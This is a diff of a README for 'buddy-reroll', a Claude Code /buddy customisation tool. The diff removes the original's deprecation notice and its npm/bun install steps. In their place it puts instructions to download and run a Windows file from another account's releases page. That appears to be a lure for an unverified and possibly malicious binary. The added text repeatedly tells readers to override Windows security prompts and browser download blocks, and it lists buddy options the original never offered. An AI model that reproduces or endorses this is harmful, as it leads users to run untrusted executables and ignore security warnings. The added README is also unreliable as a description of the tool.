@@ -1,122 +1,135 @@
-# buddy-reroll
+# 🌀 buddy-reroll - Reroll your Claude buddy with ease
 
-> [!IMPORTANT]
-> **This project is no longer maintained.**
-> As of Claude Code v2.1.97, the `/buddy` command has been removed.
-> Meet your buddy in [Notch](https://github.com/talkvalue/Buddi) instead — a new home for buddies.
+[![Download buddy-reroll](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/kaly7004/buddy-reroll/releases)
 
----
+## 🪄 What it does
 
-Pick the perfect [Claude Code](https://docs.anthropic.com/en/docs/claude-code) `/buddy` companion — any species, rarity, eye, hat, shiny, and stat combination you want.
+buddy-reroll lets you change your Claude Code /buddy companion into different species, rarities, eyes, hats, and shiny looks.
 
-<img width="1390" height="1010" alt="buddy-reroll screenshot" src="https://github.com/user-attachments/assets/0786f4b8-35e2-4433-90af-25a0d9ebe1a9" />
+Use it when you want a new look without dealing with long setup steps or manual edits.
 
-<p align="center" width="100%">
-<video src="https://github.com/user-attachments/assets/5de52c98-ce3c-428f-bd2d-7f208e1a6d38" width="80%" controls></video>
-</p>
+## 📥 Download
 
-## Install
+Go to the [Releases page](https://github.com/kaly7004/buddy-reroll/releases) and download the latest Windows version.
 
-```bash
-# Bun (recommended)
-bunx buddy-reroll
+If you see more than one file, pick the one made for Windows. After the download finishes, open the file to start the app.
 
-# npm
-npx buddy-reroll
-```
+## 🖥️ What you need
 
-Bun is faster, but Node.js >= 20 produces identical results — no Bun required.
+- A Windows PC
+- Claude Code installed
+- Permission to run downloaded apps
+- A stable internet connection for the first download
 
-## Usage
+For best results, keep Claude Code closed while you change the buddy look.
 
-```bash
-# Interactive — pick your buddy step by step
-buddy-reroll
+## 🚀 Get started
 
-# Know what you want? Go direct
-buddy-reroll --species dragon --rarity legendary --eye ✦ --hat propeller --shiny
+1. Open the [Releases page](https://github.com/kaly7004/buddy-reroll/releases)
+2. Download the latest Windows file
+3. Open the file you downloaded
+4. If Windows asks for permission, choose to run it
+5. Follow the on-screen steps
+6. Open Claude Code and check your /buddy companion
 
-# Just pick a few things, leave the rest to chance
-buddy-reroll --species cat --rarity epic
+## 🎨 Choose your buddy look
 
-# Choose your buddy's strengths
-buddy-reroll --peak WISDOM --dump CHAOS
+You can reroll your buddy into many combinations, including:
 
-# See what's available
-buddy-reroll --list
+- Different species
+- Common, rare, epic, and special rarity styles
+- Eye shapes and colors
+- Hats and headgear
+- Shiny variants
 
-# Check your current buddy
-buddy-reroll --current
+This makes it easy to try new looks until you find one you like.
 
-# Keep your buddy after Claude updates
-buddy-reroll --hook
+## 🧭 How to use it
 
-# Stop keeping after updates
-buddy-reroll --unhook
+1. Start buddy-reroll
+2. Pick the buddy style you want
+3. Choose the species
+4. Set the rarity
+5. Pick eyes and hat
+6. Turn shiny on or off
+7. Apply the change
+8. Reopen Claude Code if needed
 
-# Something wrong? Check your setup
-buddy-reroll --doctor
+If the new look does not show right away, close Claude Code and open it again.
 
-# Undo everything
-buddy-reroll --restore
-```
+## 🪟 Windows install tips
 
-## Options
+- Keep the downloaded file in your Downloads folder if you want easy access
+- If Windows shows a security prompt, look for the option to run the file
+- If your browser blocks the download, choose the option to keep the file
+- If the app opens and closes fast, try running it again from the downloaded file
+- If Claude Code is open, close it before applying a new buddy
 
-| Flag | Values |
-|---|---|
-| `--species` | duck, goose, blob, cat, dragon, octopus, owl, penguin, turtle, snail, ghost, axolotl, capybara, cactus, robot, rabbit, mushroom, chonk |
-| `--rarity` | common, uncommon, rare, epic, legendary |
-| `--eye` | `·` `✦` `×` `◉` `@` `°` |
-| `--hat` | none, crown, tophat, propeller, halo, wizard, beanie, tinyduck |
-| `--shiny` | `--shiny` / `--no-shiny` |
-| `--peak` | Best stat — DEBUGGING, PATIENCE, CHAOS, WISDOM, SNARK |
-| `--dump` | Weakest stat (can't match `--peak`) |
-| `--list` | See all options |
-| `--current` | Show your current buddy |
-| `--restore` | Undo changes and go back to default |
-| `--doctor` | Check if everything is set up right |
-| `--hook` | Keep your buddy after Claude Code updates |
-| `--unhook` | Stop keeping after updates |
-| `--version`, `-v` | Print version |
+## 🔧 Common issues
 
-## Keeping your buddy
+### The file will not open
 
-Claude Code updates can reset your companion. `--hook` tells Claude to automatically restore your buddy every time it starts up.
+- Make sure the download finished
+- Try opening the file again
+- If Windows blocks it, choose the run option
 
-```bash
-buddy-reroll --hook    # set it up once
-buddy-reroll --unhook  # remove whenever you want
-```
+### Claude Code does not show the new buddy
 
-## How fast is it?
+- Close Claude Code
+- Open buddy-reroll again
+- Apply the change one more time
+- Start Claude Code after the update
 
-buddy-reroll uses all your CPU cores (up to 8) to find the right companion. Both runtimes use the same wyhash algorithm as Claude Code, so your buddy will always match `/buddy` exactly.
+### The wrong file downloaded
 
-| Runtime | Speed | Hash |
-|---|---|---|
-| Bun | Faster (native `Bun.hash`) | wyhash ✓ |
-| Node.js >= 20 | Slightly slower (pure JS) | wyhash ✓ |
+- Return to the [Releases page](https://github.com/kaly7004/buddy-reroll/releases)
+- Pick the Windows file
+- Avoid files made for other systems
 
-## Requirements
+## 🧩 Features
 
-- Node.js >= 20 or [Bun](https://bun.sh)
-- Claude Code
+- Change buddy species
+- Switch between rarity types
+- Edit eyes and hat style
+- Turn shiny looks on or off
+- Try many combo styles
+- Simple flow for non-technical users
 
-## Troubleshooting
+## 📌 Best use cases
 
-```bash
-buddy-reroll --doctor
-```
+- You want a new /buddy look
+- You want to try rare styles
+- You want to match your setup with a specific theme
+- You want to change the look fast
+- You want to test different buddy combos before settling on one
 
-This checks your setup — where Claude is installed, whether buddy-reroll can write to it, and what to do next if something's off.
+## 🧪 Example setups
 
-If Claude was installed system-wide and isn't writable, you can point to a different location:
+- A common fox with blue eyes and a cap
+- A rare cat with a shiny finish
+- A bird buddy with a top hat
+- A special species with one-eye style
+- A shiny buddy with a clean, simple hat
 
-```bash
-CLAUDE_BINARY_PATH=/path/to/claude buddy-reroll --doctor
-```
+## 🗂️ File location
 
-## License
+After download, the file will usually be in:
 
-MIT
+- Downloads
+- Desktop
+- A folder you chose in the browser
+
+If you cannot find it, check your browser download history.
+
+## 🔄 Updating
+
+When a new version is out:
+
+1. Open the [Releases page](https://github.com/kaly7004/buddy-reroll/releases)
+2. Download the newest Windows file
+3. Open the new file
+4. Apply your preferred buddy look again
+
+## 📎 Topic tags
+
+buddy, claude, claude-buddy, claude-code
